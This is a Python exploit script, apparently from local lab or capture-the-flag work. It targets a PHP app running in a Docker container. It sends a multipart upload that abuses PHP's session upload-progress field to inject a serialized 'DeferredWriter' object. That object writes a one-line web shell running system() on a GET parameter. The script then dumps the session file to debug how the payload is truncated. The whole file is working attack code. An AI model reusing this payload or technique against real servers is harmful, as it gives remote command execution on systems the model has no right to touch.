#!/usr/bin/env python3
"""Where does the ';' cut live: $_POST or the session hook?"""
import socket
import subprocess
import sys

sys.path.insert(0, "/mnt/c/Users/andre/Downloads/php2shell-zeros/weapons")
from php2shell import multipart_body

HOST, PORT = "127.0.0.1", 8085
SID = "s" + "0" * 31
INJ = ('inj|O:14:"DeferredWriter":2:{s:4:"path";s:29:"/var/www/html/p2s_shell.php";'
       's:4:"data";s:29:"<?php @system($_GET[\'c\']); ?>";}')


def post(path, fields, files):
    body = multipart_body(fields, files)
    s = socket.create_connection((HOST, PORT), timeout=30)
    hdr = (f"POST {path} HTTP/1.1\r\nHost: {HOST}:{PORT}\r\n"
           f"Cookie: PHPSESSID={SID}\r\n"
           f"Content-Type: multipart/form-data; boundary=P2Sbound2026\r\n"
           f"Content-Length: {len(body)}\r\nConnection: close\r\n\r\n")
    s.sendall(hdr.encode() + body)
    s.settimeout(30)
    data = b""
    while True:
        try:
            c = s.recv(65536)
        except Exception:
            break
        if not c:
            break
        data += c
    s.close()
    return data.split(b"\r\n\r\n", 1)[-1].decode("utf-8", "replace")


print("--- $_POST view (postdump.php):")
out = post("/postdump.php",
           [("PHP_SESSION_UPLOAD_PROGRESS", INJ)],
           [("f", "n.txt", b"hello")])
print(out)
print("--- session key stored:")
r = subprocess.run(["docker", "exec", "van85", "cat", f"/tmp/sess_{SID}"],
                   capture_output=True, text=True)
print(r.stdout[:250])
